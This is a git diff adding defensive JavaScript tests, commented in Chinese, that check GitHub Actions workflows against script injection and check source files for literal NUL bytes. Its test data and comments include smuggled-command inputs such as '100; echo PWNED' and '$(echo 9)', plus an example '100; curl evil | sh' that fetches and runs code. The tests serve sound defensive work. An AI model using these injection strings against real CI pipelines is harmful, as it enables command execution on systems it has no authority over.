@@ -1014,3 +1014,124 @@ test('C20b 掃描器本身有效 —— 對照組（沒有這條，C20 可能是
 
   fs.rmSync(tmp, { recursive: true, force: true });
 });
+
+// ── C25／C26 workflow 輸入與原始碼衛生（2026-10 覆審 Low）─────────────
+
+/**
+ * 取出某支 workflow 裡**名稱含 `stepName`** 的 step 的 `run:` 與 `env:`（已剝註解）。
+ * 只認本 repo 用到的兩種寫法：`run: |`／`run: >` 區塊，與單行 `run: <cmd>`。
+ */
+function stepOf(file, stepName) {
+  const { lines } = workflows().find((w) => w.file === file);
+  const at = lines.findIndex((l) => /^\s*- name:/.test(l) && l.includes(stepName));
+  assert.ok(at >= 0, `${file} 找不到 step「${stepName}」`);
+  const indent = lines[at].indexOf('-') + 2;
+  const body = [];
+  for (let i = at + 1; i < lines.length; i++) {
+    const l = lines[i];
+    if (l.trim() === '') { body.push(''); continue; }
+    if (l.search(/\S/) < indent) break;
+    body.push(l);
+  }
+  const keyBlock = (key) => {
+    const k = body.findIndex((l) => new RegExp(`^\\s*${key}:`).test(l));
+    if (k < 0) return null;
+    const own = body[k].search(/\S/);
+    const inline = body[k].replace(new RegExp(`^\\s*${key}:\\s*`), '');
+    const rest = [];
+    for (let i = k + 1; i < body.length && (body[i] === '' || body[i].search(/\S/) > own); i++) rest.push(body[i]);
+    const minIndent = Math.min(...rest.filter(Boolean).map((l) => l.search(/\S/)));
+    return { inline, block: rest.map((l) => l.slice(Number.isFinite(minIndent) ? minIndent : 0)) };
+  };
+  return { run: keyBlock('run'), env: keyBlock('env') };
+}
+
+/** 以 bash 實跑某 step 的 run 腳本；`stubs` 是在腳本前宣告的 shell 函式（攔截 node／uv）。 */
+function runStep(step, env, stubs) {
+  const script = step.run.inline.startsWith('>')
+    ? step.run.block.join(' ')                        // folded：換行折成空白
+    : step.run.block.join('\n');
+  try {
+    const out = execFileSync('bash', ['-c', `set -euo pipefail\n${stubs}\n${script}`],
+      { encoding: 'utf8', env: { PATH: process.env.PATH, ...env }, stdio: ['ignore', 'pipe', 'pipe'] });
+    return { code: 0, out };
+  } catch (e) {
+    return { code: e.status ?? -1, out: `${e.stdout ?? ''}${e.stderr ?? ''}` };
+  }
+}
+
+test('C25 workflow 的 run 腳本不得直接內插 ${{ }} —— 輸入一律走 env（防 script injection）', () => {
+  // `${{ github.event.inputs.x }}` 在 run 裡是**字串替換後才交給 shell**，
+  // 輸入 `100; curl evil | sh` 就是一行指令。走 env 的話它只是一個變數值。
+  let runBlocks = 0;
+  for (const { file, lines } of workflows()) {
+    for (let i = 0; i < lines.length; i++) {
+      const m = lines[i].match(/^(\s*)(- )?run:/);
+      if (!m) continue;
+      runBlocks++;
+      const own = lines[i].search(/run:/);
+      const chunk = [lines[i]];
+      for (let j = i + 1; j < lines.length && (lines[j].trim() === '' || lines[j].search(/\S/) > own); j++) chunk.push(lines[j]);
+      assert.doesNotMatch(chunk.join('\n'), /\$\{\{/, `C25: ${file} 第 ${i + 1} 行的 run 腳本直接內插了 \${{ }}`);
+    }
+  }
+  assert.ok(runBlocks >= 10, `C25: 對照組失效 —— 只掃到 ${runBlocks} 個 run 區塊`);
+});
+
+test('C25b verify-images 的 sample 走 env 且實跑驗證為正整數（非法值不得進到 fetch-images）', () => {
+  const step = stepOf('verify-images.yml', '新鮮度檢查');
+  assert.ok(step.env && step.env.block.some((l) => /^SAMPLE:\s*\$\{\{.*inputs\.sample/.test(l)),
+    'C25b: sample 沒有經由 env.SAMPLE 傳入');
+  const stubs = 'uv() { echo "UV $*"; }';
+  for (const ok of ['100', '5', '1000']) {
+    const r = runStep(step, { SAMPLE: ok }, stubs);
+    assert.equal(r.code, 0, `C25b: SAMPLE=${ok} 應通過：${r.out}`);
+    assert.match(r.out, new RegExp(`UV run tools/fetch-images\\.py .*--sample ${ok}\\b`));
+  }
+  for (const bad of ['', '0', '-1', '1.5', 'abc', '100; echo PWNED', '$(echo 9)', '99999']) {
+    const r = runStep(step, { SAMPLE: bad }, stubs);
+    assert.notEqual(r.code, 0, `C25b: SAMPLE=${JSON.stringify(bad)} 被放行`);
+    assert.doesNotMatch(r.out, /UV run/, `C25b: SAMPLE=${JSON.stringify(bad)} 仍呼叫了 fetch-images`);
+    // 錯誤訊息會回顯輸入，所以只認「自成一行」的 PWNED——那才代表注入的指令真的執行了
+    assert.doesNotMatch(r.out, /^PWNED$/m, `C25b: SAMPLE=${JSON.stringify(bad)} 的注入被執行`);
+  }
+});
+
+test('C25c update-data 的 allow_any_delta 為 boolean 輸入，只有 true 才加 --allow-any-delta', () => {
+  // 用剝過註解、去掉空行的版本：解釋這個輸入的註解夾在 inputs: 與鍵之間
+  const wf = workflows().find((w) => w.file === 'update-data.yml').lines.filter((l) => l.trim()).join('\n');
+  assert.match(wf, /workflow_dispatch:\s*\n\s+inputs:\s*\n\s+allow_any_delta:[\s\S]*?type:\s*boolean[\s\S]*?default:\s*false/,
+    'C25c: 缺 boolean 的 allow_any_delta 輸入（預設必須 false）');
+  const step = stepOf('update-data.yml', '建置 canonical');
+  assert.ok(step.env && step.env.block.some((l) => /^ALLOW_ANY_DELTA:\s*\$\{\{.*inputs\.allow_any_delta/.test(l)),
+    'C25c: allow_any_delta 沒有經由 env 傳入');
+  const stubs = 'node() { echo "NODE $*"; }';
+  const yes = runStep(step, { ALLOW_ANY_DELTA: 'true' }, stubs);
+  assert.equal(yes.code, 0, yes.out);
+  assert.match(yes.out, /NODE tools\/fetch-appearance\.mjs --allow-any-delta/);
+  // 排程觸發時 inputs 不存在 → 空字串；以及任何非 'true' 的值，都不得放行
+  for (const v of ['', 'false', 'TRUE', '1', 'true; echo x']) {
+    const r = runStep(step, { ALLOW_ANY_DELTA: v }, stubs);
+    assert.equal(r.code, 0, r.out);
+    assert.match(r.out, /NODE tools\/fetch-appearance\.mjs/, 'C25c: 對照組——建置本身必須照跑');
+    assert.doesNotMatch(r.out, /--allow-any-delta/, `C25c: ALLOW_ANY_DELTA=${JSON.stringify(v)} 被當成放行`);
+  }
+});
+
+test('C26 原始碼不得含字面 NUL 字元（工具會把檔案當 binary，grep／diff／review 全部失明）', () => {
+  // verify-data.mjs 曾以字面 U+0000 當 Map 鍵分隔符：`git diff` 顯示 Binary files differ、
+  // `grep` 回「binary file matches」，那一行在 review 時等於隱形。
+  const exts = /\.(m?js|py|ya?ml|json|md|html)$/;
+  const dirs = ['.', 'tools', 'tests', '.github/workflows', '.ai-review'];
+  let scanned = 0;
+  for (const d of dirs) {
+    for (const f of fs.readdirSync(path.join(ROOT, d))) {
+      const p = path.join(ROOT, d, f);
+      if (!exts.test(f) || !fs.statSync(p).isFile()) continue;
+      if (/baseline-|expected-/.test(f)) continue;           // 凍結資料檔，不是原始碼
+      scanned++;
+      assert.equal(fs.readFileSync(p).indexOf(0), -1, `C26: ${path.relative(ROOT, p)} 含字面 NUL`);
+    }
+  }
+  assert.ok(scanned >= 20, `C26: 對照組失效 —— 只掃了 ${scanned} 個檔`);
+});
